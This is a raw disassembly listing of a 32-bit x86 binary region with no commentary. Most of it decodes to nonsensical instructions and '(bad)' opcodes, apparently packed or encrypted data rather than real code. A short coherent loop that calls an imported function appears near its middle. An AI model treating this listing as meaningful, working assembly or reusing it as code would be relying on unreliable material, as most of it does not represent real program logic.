  419e8b:	add    DWORD PTR [edx+0x71],eax
  419e8e:	cdq    
  419e8f:	inc    ecx
  419e90:	jmp    0x419e25
  419e92:	test   ah,0xe3
  419e95:	and    bl,dl
  419e97:	mov    al,ds:0x9396a70a
  419e9c:	(bad)  
  419e9d:	fisubr DWORD PTR [esi*4+0x274e0034]
  419ea4:	adc    eax,0x2fc11fa
  419ea9:	dec    ebx
  419eaa:	add    DWORD PTR [eax+0x36],ecx
  419ead:	push   esi
  419eae:	call   0xae91:0x2f208ef0
  419eb5:	xchg   ecx,eax
  419eb6:	xchg   esi,eax
  419eb7:	in     al,dx
  419eb8:	and    esi,eax
  419eba:	cld    
  419ebb:	and    dh,BYTE PTR [eax]
  419ebd:	arpl   WORD PTR [esi+0x7775e230],ax
  419ec3:	aam    0x19
  419ec5:	jecxz  0x419f39
  419ec7:	arpl   WORD PTR [ebp+0x13],di
  419eca:	add    eax,0xbc11b19b
  419ecf:	add    DWORD PTR [eax-0x736ba332],edx
  419ed5:	sbb    eax,0x6179390e
  419edb:	lods   eax,DWORD PTR ds:[esi]
  419edc:	rol    BYTE PTR [edx+eiz*8-0x14],1
  419ee0:	add    ch,0x49
  419ee3:	dec    edi
  419ee4:	mov    cl,0x48
  419ee6:	popf   
  419ee7:	adc    al,0xcc
  419ee9:	repz mov ds:0xde227c84,al
  419eef:	add    dh,BYTE PTR ds:0x93a7bd51
  419ef5:	jb     0x419ebd
  419ef7:	xor    BYTE PTR [ecx-0x72ed8210],bl
  419efd:	dec    ebp
  419efe:	hlt    
  419eff:	leave  
  419f00:	cmc    
  419f01:	xchg   edi,eax
  419f02:	and    BYTE PTR [ebx-0x40639184],dh
  419f08:	jae    0x419ebd
  419f0a:	lahf   
  419f0b:	mov    ah,0x70
  419f0d:	dec    ebp
  419f0e:	enter  0xe290,0x30
  419f12:	test   BYTE PTR [edi],dl
  419f14:	aam    0x2b
  419f16:	es int3 
  419f18:	jnp    0x419ec2
  419f1a:	xchg   ecx,eax
  419f1b:	outs   dx,BYTE PTR ds:[esi]
  419f1c:	lahf   
  419f1d:	outs   dx,BYTE PTR ds:[esi]
  419f1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f1f:	jne    0x419ef7
  419f21:	in     al,dx
  419f22:	xor    al,0x86
  419f24:	je     0x419f5a
  419f26:	mov    edx,0x588b73d8
  419f2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f2c:	push   0x1b547132
  419f31:	sbb    cl,BYTE PTR [edi+0x66c1b558]
  419f37:	rcr    dl,cl
  419f39:	pop    DWORD PTR [edx]
  419f3b:	push   ecx
  419f3c:	pop    esi
  419f3d:	icebp  
  419f3e:	dec    ecx
  419f3f:	imul   ebx,esp,0x6e996a3e
  419f45:	data16 sub dh,BYTE PTR [ecx+edx*2-0x5297a451]
  419f4d:	jecxz  0x419f4e
  419f4f:	mov    ds:0xaa692b22,al
  419f54:	pop    edx
  419f55:	cmp    BYTE PTR [esi+0x71c1365e],ah
  419f5b:	enter  0x74b1,0x13
  419f5f:	icebp  
  419f60:	xor    ebx,DWORD PTR [esi]
  419f62:	inc    edi
  419f63:	les    ecx,FWORD PTR [esp-0x70]
  419f67:	mov    ch,0x1f
  419f69:	cld    
  419f6a:	sbb    DWORD PTR es:[ecx*8+0x12b44ee8],edi
  419f72:	xchg   edx,eax
  419f73:	scas   al,BYTE PTR es:[edi]
  419f74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f75:	mov    DWORD PTR [edx-0x4f],esp
  419f78:	jg     0x419fd1
  419f7a:	mov    ah,0x29
  419f7c:	retf   0xbc8b
  419f7f:	test   ch,0x36
  419f82:	sub    BYTE PTR [edx+0x5c3255b9],bl
  419f88:	es jae 0x419f0c
  419f8b:	mov    bh,0x81
  419f8d:	lock in eax,0x5
  419f90:	fnstsw WORD PTR [edx]
  419f92:	sbb    al,0xd1
  419f94:	mov    WORD PTR [ecx+0x3f],ss
  419f97:	and    BYTE PTR [edi],0x65
  419f9a:	or     dh,BYTE PTR [ecx+0x789625e6]
  419fa0:	(bad)  
  419fa1:	ds xchg esp,eax
  419fa3:	lock push esi
  419fa5:	xchg   esp,eax
  419fa6:	inc    edi
  419fa7:	loop   0x419fb8
  419fa9:	ret    
  419faa:	bt     DWORD PTR [esi],ebx
  419fad:	xor    al,0x83
  419faf:	js     0x419f81
  419fb1:	ja     0x419f4a
  419fb3:	xor    al,0x67
  419fb5:	pop    ss
  419fb6:	cwde   
  419fb7:	(bad)  
  419fb8:	mov    ds:0x6eff53a5,eax
  419fbd:	cmp    al,0xe2
  419fbf:	out    dx,eax
  419fc0:	push   ss
  419fc1:	(bad)  
  419fc2:	in     eax,dx
  419fc3:	push   edx
  419fc4:	pushf  
  419fc5:	mov    ecx,0x305a7e5e
  419fca:	lods   eax,DWORD PTR ds:[esi]
  419fcb:	adc    bh,BYTE PTR [eax-0x5707f5c3]
  419fd1:	push   0x74de9782
  419fd6:	jle    0x419f6a
  419fd8:	outs   dx,DWORD PTR ds:[esi]
  419fd9:	lock pop ecx
  419fdb:	jge    0x419f6c
  419fdd:	mov    bh,0x94
  419fdf:	sbb    BYTE PTR [ebp+0x5a],0x89
  419fe3:	outs   dx,DWORD PTR ds:[esi]
  419fe4:	jnp    0x41a04c
  419fe6:	ins    BYTE PTR es:[edi],dx
  419fe7:	mov    esi,eax
  419fe9:	cs mov bl,0xb0
  419fec:	ds xor eax,0xe5e8bc8
  419ff2:	mov    dh,0xdd
  419ff4:	ficomp DWORD PTR [ebp-0x10]
  419ff7:	xchg   DWORD PTR [edi],edx
  419ff9:	inc    ebp
  419ffa:	inc    edx
  419ffb:	dec    ebx
  419ffc:	inc    edx
  419ffd:	lahf   
  419ffe:	imul   edx,ebx,0xa22f9495
  41a004:	sbb    DWORD PTR [bx+di-0xa6a],esp
  41a009:	aam    0x23
  41a00b:	mov    al,ds:0xb26338d7
  41a010:	pop    esi
  41a011:	xor    dh,BYTE PTR [edi-0x167c1698]
  41a017:	rol    BYTE PTR [eax],0xa2
  41a01a:	and    BYTE PTR [eax-0x1d832489],0x9a
  41a021:	push   es
  41a022:	jo     0x41a073
  41a024:	lods   al,BYTE PTR ds:[esi]
  41a025:	add    DWORD PTR [ecx+0x11884f92],esp
  41a02b:	pop    edi
  41a02c:	pusha  
  41a02d:	mov    ecx,0x83b694d9
  41a032:	inc    ecx
  41a033:	scas   al,BYTE PTR es:[edi]
  41a034:	out    0x23,al
  41a036:	fisub  DWORD PTR [esi-0x13]
  41a039:	aaa    
  41a03a:	and    al,0x45
  41a03c:	out    dx,al
  41a03d:	in     al,dx
  41a03e:	or     eax,DWORD PTR [esi-0x6c243f0c]
  41a044:	and    eax,0x20104779
  41a049:	shl    BYTE PTR [ebp-0x40c12790],0x63
  41a050:	loop   0x41a078
  41a052:	lock xchg edx,eax
  41a054:	pop    edx
  41a055:	cdq    
  41a056:	in     al,dx
  41a057:	call   0x27b11b15
  41a05c:	adc    al,BYTE PTR [edi+0x54b98918]
  41a062:	loop   0x41a079
  41a064:	or     eax,0x5ea758eb
  41a069:	jl     0x41a0ae
  41a06b:	xor    al,0xc8
  41a06d:	test   al,0xef
  41a06f:	pop    esi
  41a070:	mov    dh,0x86
  41a072:	out    0xf4,eax
  41a074:	test   eax,0x331f160b
  41a079:	or     eax,0x84fb01f6
  41a07e:	outs   dx,DWORD PTR ds:[esi]
  41a07f:	mov    edi,0x6c51fd7e
  41a084:	int    0x1e
  41a086:	in     al,0x84
  41a088:	xchg   BYTE PTR [eax],bl
  41a08a:	push   ebx
  41a08b:	dec    eax
  41a08c:	ror    edx,0xa3
  41a08f:	sbb    DWORD PTR ds:0x134aa708,eax
  41a095:	add    DWORD PTR [ebx+ebx*1-0x69],0x6cacd2fe
  41a09d:	jmp    0xb2d645f9
  41a0a2:	leave  
  41a0a3:	xor    al,ch
  41a0a5:	out    dx,eax
  41a0a6:	dec    ebp
  41a0a7:	xchg   ebx,eax
  41a0a8:	nop
  41a0a9:	imul   ebx,edx,0xffffffe8
  41a0ac:	sub    al,0xa0
  41a0ae:	sub    al,0x20
  41a0b0:	rol    dl,0x93
  41a0b3:	xlat   BYTE PTR ds:[ebx]
  41a0b4:	pop    ecx
  41a0b5:	(bad)  
  41a0b6:	push   esp
  41a0b7:	and    BYTE PTR [edx],dl
  41a0b9:	inc    BYTE PTR [edx]
  41a0bb:	add    dl,BYTE PTR [edi]
  41a0bd:	xchg   esp,eax
  41a0be:	div    DWORD PTR [ebx-0x17]
  41a0c1:	nop
  41a0c2:	cmp    esp,DWORD PTR [edx-0x21]
  41a0c5:	pop    ebx
  41a0c6:	cmp    esi,edx
  41a0c8:	inc    edi
  41a0c9:	and    eax,DWORD PTR [ebp-0x71]
  41a0cc:	xchg   ecx,eax
  41a0cd:	cld    
  41a0ce:	loopne 0x41a0f0
  41a0d0:	cmp    BYTE PTR [ecx],bh
  41a0d2:	mov    ebp,0x97d2dbc8
  41a0d7:	mov    ecx,0xef4652ce
  41a0dc:	pop    edx
  41a0dd:	shl    BYTE PTR [eax],1
  41a0df:	ins    BYTE PTR es:[edi],dx
  41a0e0:	retf   0x2caa
  41a0e3:	mov    ah,0x5d
  41a0e5:	(bad)
  41a0e9:	cli    
  41a0ea:	cmp    ebx,edx
  41a0ec:	mov    eax,ds:0xab793399
  41a0f1:	repnz repnz mov dl,0x4b
  41a0f5:	ss call 0x36d0d14b
  41a0fb:	fsubr  QWORD PTR [eax+0x4318d45d]
  41a101:	imul   ecx,DWORD PTR [ebx+ebp*1],0x75d14be4
  41a108:	outs   dx,BYTE PTR ds:[esi]
  41a109:	xor    BYTE PTR [ecx-0xd],ah
  41a10c:	lds    ecx,FWORD PTR [ecx]
  41a10e:	test   DWORD PTR [edx-0x7f],esi
  41a111:	jns    0x41a0a2
  41a113:	xlat   BYTE PTR ds:[ebx]
  41a114:	mov    eax,0xab06ae37
  41a119:	or     al,0x1a
  41a11b:	hlt    
  41a11c:	and    ebx,DWORD PTR [edi+0x30]
  41a11f:	ficomp WORD PTR [ebx-0x4b]
  41a122:	(bad)  
  41a123:	bound  esi,QWORD PTR [edi]
  41a125:	and    ch,BYTE PTR [esi]
  41a127:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a128:	push   ss
  41a129:	in     eax,dx
  41a12a:	ds mov ebp,ds
  41a12d:	lods   al,BYTE PTR ds:[esi]
  41a12e:	sub    bh,bh
  41a130:	pop    ebx
  41a131:	cld    
  41a132:	xchg   ecx,eax
  41a133:	bound  esi,QWORD PTR [edx]
  41a135:	arpl   WORD PTR [ebx-0x6fdaed56],bp
  41a13b:	mov    ebx,0xb860935c
  41a140:	mov    al,0x46
  41a142:	or     ecx,ebx
  41a144:	lea    ecx,[ecx]
  41a146:	sahf   
  41a147:	stos   DWORD PTR es:[edi],eax
  41a148:	or     eax,0x544990b2
  41a14d:	xchg   edx,eax
  41a14e:	inc    esp
  41a14f:	(bad)  
  41a150:	xchg   ecx,eax
  41a151:	fwait
  41a152:	in     eax,0xa5
  41a154:	adc    eax,0xc1d08b8
  41a159:	push   ecx
  41a15a:	iret   
  41a15b:	sbb    al,0x71
  41a15d:	stos   BYTE PTR es:[edi],al
  41a15e:	fild   DWORD PTR [edx]
  41a160:	dec    ebx
  41a161:	sbb    eax,0xa6c2df77
  41a166:	outs   dx,BYTE PTR ds:[esi]
  41a167:	dec    ebx
  41a168:	fcomi  st,st(1)
  41a16a:	in     al,dx
  41a16b:	cmp    ebp,ecx
  41a16d:	and    al,0x8
  41a16f:	out    dx,al
  41a170:	pop    esp
  41a171:	aaa    
  41a172:	(bad)  
  41a176:	retf   
  41a177:	ss cld 
  41a179:	xchg   BYTE PTR [esi],cl
  41a17b:	lds    edi,FWORD PTR [edx]
  41a17d:	cs push edx
  41a17f:	cdq    
  41a180:	dec    ecx
  41a181:	xchg   esi,eax
  41a182:	(bad)  
  41a183:	mov    edi,0xdd62cfb
  41a188:	inc    ecx
  41a189:	nop    ecx
  41a18c:	(bad)  
  41a18d:	mov    bl,0x48
  41a18f:	fcomp  DWORD PTR [ebp+0xe]
  41a192:	call   0x4f0:0x915a274f
  41a199:	lock mov BYTE PTR [eax+edi*1-0xf],cl
  41a19e:	es xchg ebx,eax
  41a1a0:	xchg   bh,al
  41a1a2:	inc    ebp
  41a1a3:	enter  0x853e,0x9c
  41a1a7:	clc    
  41a1a8:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  41a1af:	mov    edx,DWORD PTR [ebp+0x8]
  41a1b2:	mov    DWORD PTR ds:0x42a37d,0x17
  41a1bc:	cmp    DWORD PTR ds:0x42a37d,0x0
  41a1c3:	je     0x41a70a
  41a1c9:	cmp    DWORD PTR ds:0x42a37d,0x20
  41a1d0:	jne    0x41a1e6
  41a1d6:	push   0x8ff4
  41a1db:	push   0x7f63
  41a1e0:	call   DWORD PTR ds:0x425024
  41a1e6:	mov    edi,DWORD PTR ds:0x42a37d
  41a1ec:	dec    edi
  41a1ed:	mov    DWORD PTR ds:0x42a37d,edi
  41a1f3:	jmp    0x41a1bc
  41a1f8:	jmp    0x41a70a
  41a1fd:	(bad)  
  41a1fe:	iret   
  41a1ff:	cmp    eax,0xdad1d5d3
  41a204:	fld    st(7)
  41a206:	outs   dx,DWORD PTR ds:[esi]
  41a207:	fisubr WORD PTR [edi+0xd8617d4]
  41a20d:	ins    BYTE PTR es:[edi],dx
  41a20e:	clc    
  41a20f:	jg     0x41a289
  41a211:	jae    0x41a28f
  41a213:	js     0x41a28d
  41a215:	aaa    
  41a216:	jnp    0x41a28b
  41a218:	cli    
  41a219:	sub    eax,0x50b1b2f3
  41a21e:	or     al,0x60
  41a220:	sti    
  41a221:	inc    ebp
  41a222:	sub    edx,DWORD PTR [edx-0x3e]
  41a225:	lods   eax,DWORD PTR ds:[esi]
  41a226:	(bad)  
  41a227:	cmp    ecx,DWORD PTR [edi-0x27]
  41a22a:	popf   
  41a22b:	xor    BYTE PTR ds:0xab6ec0f0,0x60
  41a232:	push   es
  41a233:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a234:	add    edx,eax
  41a236:	sbb    esp,ebp
  41a238:	lods   al,BYTE PTR ds:[esi]
  41a239:	push   esi
  41a23a:	loopne 0x41a20f
  41a23c:	xor    BYTE PTR [esi+0x2],0x97
  41a240:	and    ebp,DWORD PTR [esi+0x6c]
  41a243:	lds    ebx,FWORD PTR [ebp-0xb]
  41a246:	pushf  
  41a247:	lods   al,BYTE PTR ds:[esi]
  41a248:	jne    0x41a2be
  41a24a:	sti    
  41a24b:	jmp    0x41a24a
  41a24d:	adc    DWORD PTR [edx],ebx
  41a24f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a250:	mov    dl,0xa8
  41a252:	or     esp,edx
  41a254:	mov    eax,0x4d420c8f
  41a259:	jg     0x41a257
  41a25b:	(bad)  
  41a25c:	arpl   WORD PTR [ecx-0x131c9de3],ax
  41a262:	or     DWORD PTR [ecx+ebx*8-0x73],edx
  41a266:	outs   dx,BYTE PTR ds:[esi]
  41a267:	(bad)  [esp+esi*4]
  41a26a:	mov    al,ds:0x5661c920
  41a26f:	xchg   esi,eax
  41a270:	push   edi
  41a271:	sbb    eax,0x1a853012
  41a276:	xchg   edi,eax
  41a277:	mov    bl,0xb3
  41a279:	popf   
  41a27a:	mov    edi,DWORD PTR ds:0xdacb5932
  41a280:	xchg   DWORD PTR ds:0xd9e6e1c7,esi
  41a286:	cmp    bl,dh
  41a288:	xor    cl,ah
  41a28a:	mov    bh,0x34
  41a28c:	xor    DWORD PTR [eax+esi*8-0xea67af6],esi
  41a293:	xchg   esi,eax
  41a294:	jbe    0x41a241
  41a296:	loop   0x41a28f
  41a298:	repz adc cl,bh
  41a29b:	lods   eax,DWORD PTR ds:[esi]
  41a29c:	xor    dh,bl
  41a29e:	icebp  
  41a29f:	sbb    edi,esp
  41a2a1:	imul   BYTE PTR [eax-0x7d]
  41a2a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2a5:	inc    eax
  41a2a6:	mov    bh,0xa8
  41a2a8:	jmp    0xf6db:0xcdfb705b
  41a2af:	popf   
  41a2b0:	pop    ds
  41a2b1:	add    BYTE PTR [esi-0x7c],al
  41a2b4:	sbb    eax,0xf283dfc9
  41a2b9:	cs out dx,al
  41a2bb:	test   bl,bh
  41a2bd:	mov    edx,0x963cd4fb
  41a2c2:	bound  esp,QWORD PTR [eax-0x2bc4f9b]
  41a2c8:	lods   eax,DWORD PTR ds:[esi]
  41a2c9:	inc    edx
  41a2ca:	sbb    BYTE PTR [eax+0x4c6597d6],0x55
  41a2d1:	rcl    BYTE PTR [eax-0x5205e759],cl
  41a2d7:	adc    eax,0xad206a04
  41a2dc:	xor    edi,ebp
  41a2de:	int    0xb2
  41a2e0:	ret    0xf9f1
  41a2e3:	mov    BYTE PTR ds:0xc3def59d,0xa5
  41a2ea:	aam    0x3e
  41a2ec:	xchg   esi,eax
  41a2ed:	jmp    0xd57408a0
  41a2f2:	mov    esi,gs
  41a2f4:	call   0x6ec9b97a
  41a2f9:	pop    ebx
  41a2fa:	fld    DWORD PTR [ecx]
  41a2fc:	and    eax,0xc777e2e9
  41a301:	xchg   BYTE PTR [esi],ch
  41a303:	push   cs
  41a304:	(bad)  
  41a305:	cmp    eax,0x705d03f4
  41a30a:	in     eax,0x7b
  41a30c:	ja     0x41a2c9
  41a30e:	mov    bl,0xf3
  41a310:	mov    ecx,0x85c92cfa
  41a315:	icebp  
  41a316:	test   DWORD PTR [ebx-0x7807bb4d],esi
  41a31c:	fistp  QWORD PTR [ebx+ebp*2-0x63]
  41a320:	mov    al,ds:0x255d5d91
  41a325:	icebp  
  41a326:	sub    BYTE PTR cs:[esi+eiz*1+0x5e],0x60
  41a32c:	add    al,0x15
  41a32e:	stos   DWORD PTR es:[edi],eax
  41a32f:	stos   DWORD PTR es:[edi],eax
  41a330:	jle    0x41a2ea
  41a332:	xor    BYTE PTR [edx+0x310a892],ah
  41a338:	jo     0x41a305
  41a33a:	sti    
  41a33b:	pop    ecx
  41a33c:	test   BYTE PTR [edx],0x14
  41a33f:	xor    BYTE PTR [edi+edi*8-0x399d92ec],bh
  41a346:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a347:	push   edi
  41a348:	loop   0x41a30a
  41a34a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a34b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a34c:	imul   ebp,DWORD PTR [ebx-0x64e4fe8b],0xf87aa0ba
  41a356:	ficomp WORD PTR [ebp+0x64]
  41a359:	outs   dx,BYTE PTR ds:[esi]
  41a35a:	push   ebp
  41a35b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a35c:	popf   
  41a35d:	popa   
  41a35e:	sbb    eax,0x6c8afef1
  41a363:	cpuid  
  41a365:	jg     0x41a325
  41a367:	mov    al,0x9e
  41a369:	cmp    eax,0x24769c80
  41a36e:	pop    eax
  41a36f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a370:	ror    DWORD PTR [edi+0x17],cl
  41a373:	xchg   edi,eax
  41a374:	mov    al,ds:0xfc506e87
  41a379:	addr16 push ebx
  41a37b:	dec    ecx
  41a37c:	sbb    esi,ecx
  41a37e:	xchg   DWORD PTR [esi],esi
  41a380:	shl    DWORD PTR [edi],cl
  41a382:	mov    dh,0xa9
  41a384:	sbb    BYTE PTR [edi+0x7bff566],dh
  41a38a:	push   0x20
  41a38c:	add    edx,ebx
  41a38e:	cwde   
  41a38f:	xchg   ecx,eax
  41a390:	xchg   edi,eax
  41a391:	xchg   esp,eax
  41a392:	dec    ebp
  41a393:	mov    dl,0x4
  41a395:	inc    edx
  41a396:	iret   
  41a397:	(bad)  
  41a398:	rcl    DWORD PTR [edi+0x2a],cl
  41a39b:	or     eax,0x1081921b
  41a3a0:	jno    0x41a3d8
  41a3a2:	sar    edi,1
  41a3a4:	je     0x41a328
  41a3a6:	xor    BYTE PTR [edx],bl
  41a3a8:	stos   DWORD PTR es:[edi],eax
  41a3a9:	push   esp
  41a3aa:	js     0x41a3b2
  41a3ac:	cmp    BYTE PTR [ebp+0x3a],0x99
  41a3b0:	adc    DWORD PTR [eax],ebp
  41a3b2:	dec    esp
  41a3b3:	test   BYTE PTR [edi+0x3],bh
  41a3b6:	pop    ebx
  41a3b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3b8:	dec    esp
  41a3b9:	int3   
  41a3ba:	sbb    eax,0x72d7a1ce
  41a3bf:	xchg   DWORD PTR ds:0xd6ee8316,esp
  41a3c5:	pushf  
  41a3c6:	pop    ebx
  41a3c7:	shl    DWORD PTR [esi+0x5f],0x8f
  41a3cb:	cmp    bl,BYTE PTR [ebx-0x68]
  41a3ce:	or     bh,BYTE PTR [esi-0x6a]
  41a3d1:	mov    bh,0xbb
  41a3d3:	cli    
  41a3d4:	add    cl,BYTE PTR [eax]
  41a3d6:	lock xlat BYTE PTR ds:[ebx]
  41a3d8:	inc    edi
  41a3d9:	std    
  41a3da:	add    dl,BYTE PTR [ebp+0x7f]
  41a3dd:	outs   dx,BYTE PTR ds:[esi]
  41a3de:	xor    al,0x82
  41a3e0:	inc    eax
  41a3e1:	mov    bl,0x39
  41a3e3:	mov    ss,WORD PTR [edx]
  41a3e5:	push   ecx
  41a3e6:	cmp    ebp,ebp
  41a3e8:	jmp    0x2e64:0x85c4dd88
  41a3ef:	leave  
  41a3f0:	mov    eax,0x1913cfdf
  41a3f5:	jmp    0x3ba7429d
  41a3fa:	cmp    eax,0x7fa4d79a
  41a3ff:	out    dx,eax
  41a400:	inc    esi
  41a401:	and    DWORD PTR [edi+edx*8+0x73],0x62
  41a406:	cmp    ah,ch
  41a408:	add    eax,0xafd1b2b8
  41a40d:	mov    bh,0x97
  41a40f:	sbb    DWORD PTR [ebx-0x67],edi
  41a412:	shl    DWORD PTR [esi+0x35c7a8b4],cl
  41a418:	(bad)
  41a41c:	pop    ebx
  41a41d:	mov    edi,0x14ece00a
  41a422:	ret    0x2cbf
  41a425:	cmp    al,0x3a
  41a427:	arpl   WORD PTR [ebx+0x8],sp
  41a42a:	aas    
  41a42b:	ds dec esi
  41a42d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a42e:	icebp  
  41a42f:	push   es
  41a430:	inc    esi
  41a431:	(bad)  
  41a432:	and    al,0x8a
  41a434:	adc    al,0x59
  41a436:	xor    eax,0xfeab326d
  41a43b:	inc    ebx
  41a43c:	test   BYTE PTR [ecx],cl
  41a43e:	push   ebp
  41a43f:	pop    ss
  41a440:	inc    esp
  41a441:	imul   edi,DWORD PTR [ebx-0x62],0x31b1caae
  41a448:	mov    ebp,0x2bad6c37
  41a44d:	mov    esp,0x26df259c
  41a452:	jmp    0x41a43a
  41a454:	test   al,0xf1
  41a456:	iret   
  41a457:	in     eax,0x64
  41a459:	(bad)  
  41a45b:	or     eax,0xf46b9f16
  41a460:	push   ebx
  41a461:	pop    esi
  41a462:	ins    DWORD PTR es:[edi],dx
  41a463:	std    
  41a464:	jp     0x41a460
  41a466:	add    BYTE PTR [ebp-0x202038fd],bh
  41a46c:	sbb    cl,bl
  41a46e:	mov    ch,0x30
  41a470:	inc    ebp
  41a471:	push   cs
  41a472:	mov    ds:0xc6433bbb,eax
  41a477:	sbb    DWORD PTR [ebx-0x245f72fe],edi
  41a47d:	inc    ebx
  41a47e:	mov    edx,0xca97cbf4
  41a483:	jl     0x41a441
  41a485:	xchg   dl,dl
  41a487:	jge    0x41a491
  41a489:	aad    0xfd
  41a48b:	ret    
  41a48c:	imul   edi,DWORD PTR [ecx+0x1c4ecc26],0x1855a92e
  41a496:	pop    esp
  41a497:	inc    ebx
  41a498:	mov    WORD PTR [ecx],?
  41a49a:	dec    edx
  41a49b:	cmp    ecx,ebp
  41a49d:	mov    ah,0x15
  41a49f:	xor    DWORD PTR [esi],eax
  41a4a1:	jno    0x41a51d
  41a4a3:	push   es
  41a4a4:	clc    
  41a4a5:	mov    eax,ds:0xdccb10a5
  41a4aa:	jbe    0x41a434
  41a4ac:	adc    eax,eax
  41a4ae:	es leave 
  41a4b0:	fwait
  41a4b1:	cwde   
  41a4b2:	ja     0x41a45b
  41a4b4:	lock sub dh,BYTE PTR [esi-0x6f]
  41a4b8:	inc    esp
  41a4b9:	push   edx
  41a4ba:	call   0x17f9:0x160ebee1
  41a4c1:	lds    ebp,FWORD PTR [ebx+0x8]
  41a4c4:	pop    es
  41a4c5:	loop   0x41a4a3
  41a4c7:	mov    ?,WORD PTR [edx-0x4e163c0d]
  41a4cd:	inc    edx
  41a4ce:	pop    edi
  41a4cf:	mov    ebp,edx
  41a4d1:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41a4d3:	xor    DWORD PTR ds:[edi+0x2fcb2f88],edx
  41a4da:	repnz xor DWORD PTR [esi],0xffffff99
  41a4de:	lock mov BYTE PTR [eax-0x3d58e553],ch
  41a4e5:	rcl    BYTE PTR [edx+0x6f],1
  41a4e8:	push   0x1c
  41a4ea:	imul   edx,esp,0x11
  41a4ed:	loopne 0x41a4cf
  41a4ef:	push   ebx
  41a4f0:	push   ecx
  41a4f1:	ja     0x41a538
  41a4f3:	mov    esp,0xfb91435b
  41a4f8:	xor    dh,BYTE PTR [edx-0x5bcd1fd7]
  41a4fe:	(bad)
  41a501:	inc    esp
  41a502:	cld    
  41a503:	cli    
  41a504:	and    eax,0x7093909d
  41a509:	xchg   esp,eax
  41a50a:	mov    bl,0xd0
  41a50c:	adc    DWORD PTR [ebx],0xf2f6b444
  41a512:	mov    ebx,0x74b7bc8e
  41a517:	sbb    eax,0x82e24abc
  41a51c:	push   edi
  41a51d:	adc    eax,DWORD PTR [ebp-0x70]
  41a520:	xor    eax,0x3888b755
  41a525:	add    ecx,ecx
  41a527:	jge    0x41a575
  41a529:	mov    cl,0xd5
  41a52b:	push   ecx
  41a52c:	mov    ebp,0x7b2124c6
  41a531:	push   ss
  41a532:	mov    ecx,0x5d594389
  41a537:	xchg   BYTE PTR [edx+0x5b],bl
  41a53a:	outs   dx,DWORD PTR ds:[esi]
  41a53b:	inc    edi
  41a53c:	imul   eax,DWORD PTR [esp+ebx*4-0x33f6f715],0xffffff84
  41a544:	rcr    ah,cl
  41a546:	adc    DWORD PTR [edx-0x79],0x79
  41a54a:	adc    eax,0x7e859553
  41a54f:	mov    DWORD PTR [eax+edi*1+0x5c5df323],esi
  41a556:	jmp    DWORD PTR [edx-0x14a9cf01]
  41a55c:	pop    esi
  41a55d:	xor    eax,0x7c1f9692
  41a562:	icebp  
  41a563:	push   edx
  41a564:	sbb    BYTE PTR [ebx+0x601010b4],cl
  41a56a:	xor    BYTE PTR [ecx+ebx*1],al
  41a56d:	dec    esi
  41a56e:	jns    0x41a511
  41a570:	stos   DWORD PTR es:[edi],eax
  41a571:	stos   DWORD PTR es:[edi],eax
  41a572:	adc    eax,0xa432f1d7
  41a577:	or     ecx,DWORD PTR [edi+esi*1]
  41a57a:	cwde   
  41a57b:	sbb    al,0xb4
  41a57e:	pop    edx
  41a57f:	cmp    ebx,eax
  41a581:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a582:	cmp    eax,0x4d0d9e2a
  41a587:	pop    edx
  41a588:	xchg   edx,eax
  41a589:	inc    ebx
  41a58a:	mov    ch,0x15
  41a58c:	xor    DWORD PTR [esi+0x30],esi
  41a58f:	dec    eax
  41a590:	dec    esp
  41a591:	mov    cl,0xda
  41a593:	mov    edx,ebx
  41a595:	adc    eax,0x6fce8763
  41a59a:	cmp    esi,DWORD PTR [ecx]
  41a59c:	dec    esi
  41a59d:	nop
  41a59e:	out    0x1,al
  41a5a0:	cmc    
  41a5a1:	es in  al,dx
  41a5a3:	popa   
  41a5a4:	(bad)  
  41a5a6:	mov    ds:0xe0ad3d09,al
  41a5ab:	or     ah,dl
  41a5ad:	sbb    al,0x37
  41a5af:	push   es
  41a5b0:	(bad)  
  41a5b1:	jae    0x41a5af
  41a5b3:	out    0x76,al
  41a5b5:	push   ebp
  41a5b6:	mov    ebp,esp
  41a5b8:	xchg   ecx,eax
  41a5b9:	loop   0x41a5f6
  41a5bb:	mov    ecx,0x7d1bd79
  41a5c0:	fwait
  41a5c1:	lds    eax,FWORD PTR [ebx+0x30c10a65]
  41a5c7:	aad    0x5c
  41a5c9:	jns    0x41a593
  41a5cb:	adc    eax,0x1cc20cd7
  41a5d0:	mov    edx,0x3cf098bf
  41a5d5:	out    dx,al
  41a5d6:	pop    eax
  41a5d7:	dec    eax
  41a5d8:	mov    eax,ds:0x61ac181b
  41a5dd:	xchg   esp,eax
  41a5de:	mov    DWORD PTR [ebx],ebx
  41a5e0:	(bad)  
  41a5e1:	cmp    bh,BYTE PTR [ebx]
  41a5e3:	jne    0x41a591
  41a5e5:	shl    DWORD PTR [edx],cl
  41a5e7:	adc    DWORD PTR [ecx-0x10],esi
  41a5ea:	add    dl,bh
  41a5ec:	sub    al,0x4e
  41a5ee:	out    dx,al
  41a5ef:	sbb    BYTE PTR [ebx],0xa2
  41a5f2:	cs into 
  41a5f4:	cmp    al,0x48
  41a5f6:	neg    DWORD PTR [ebx+0x3221d9e3]
  41a5fc:	cmp    DWORD PTR [esi+0x72fecba7],0x65
  41a603:	dec    ebx
  41a604:	imul   ebx,DWORD PTR [esi+ecx*4+0x2c],0x9e047ae0
  41a60c:	jbe    0x41a5e7
  41a60e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a60f:	mov    al,0x64
  41a611:	(bad)  
